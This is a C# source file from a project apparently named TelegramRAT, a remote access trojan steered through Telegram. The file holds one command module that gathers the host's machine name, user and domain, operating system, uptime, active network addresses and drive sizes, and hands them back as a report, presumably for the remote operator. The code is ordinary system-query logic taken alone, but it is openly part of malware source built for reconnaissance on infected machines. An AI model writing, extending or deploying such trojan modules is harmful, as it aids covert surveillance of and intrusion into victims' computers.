namespace TelegramRAT.Commands;

using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using TelegramRAT.Models;

internal sealed class SystemInfo : IAsyncCommand
{
    public Task<CommandResult> ExecuteAsync(string[] args)
    {
        var sb = new StringBuilder();
        sb.AppendLine("=== System Information ===");
        sb.AppendLine($"Machine: {Environment.MachineName}");
        sb.AppendLine($"User: {Environment.UserDomainName}\\{Environment.UserName}");
        sb.AppendLine($"OS: {RuntimeInformation.OSDescription}");
        sb.AppendLine($"Architecture: {RuntimeInformation.OSArchitecture}");
        sb.AppendLine($"Processors: {Environment.ProcessorCount}");
        sb.AppendLine($".NET: {RuntimeInformation.FrameworkDescription}");
        sb.AppendLine($"System Dir: {Environment.SystemDirectory}");
        sb.AppendLine($"Uptime: {TimeSpan.FromMilliseconds(Environment.TickCount64):d\\.hh\\:mm\\:ss}");
        sb.AppendLine();
        sb.AppendLine("=== Network ===");

        foreach (var ni in NetworkInterface.GetAllNetworkInterfaces()
            .Where(n => n.OperationalStatus == OperationalStatus.Up))
        {
            var ipProps = ni.GetIPProperties();
            var ipv4 = ipProps.UnicastAddresses
                .FirstOrDefault(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
            if (ipv4 != null)
                sb.AppendLine($"  {ni.Name}: {ipv4.Address}");
        }

        sb.AppendLine();
        sb.AppendLine("=== Drives ===");
        foreach (var drive in DriveInfo.GetDrives().Where(d => d.IsReady))
        {
            sb.AppendLine($"  {drive.Name} [{drive.DriveFormat}] {drive.AvailableFreeSpace / (1024 * 1024 * 1024)}GB free / {drive.TotalSize / (1024 * 1024 * 1024)}GB total");
        }

        return Task.FromResult(CommandResult.Text(sb.ToString()));
    }
}
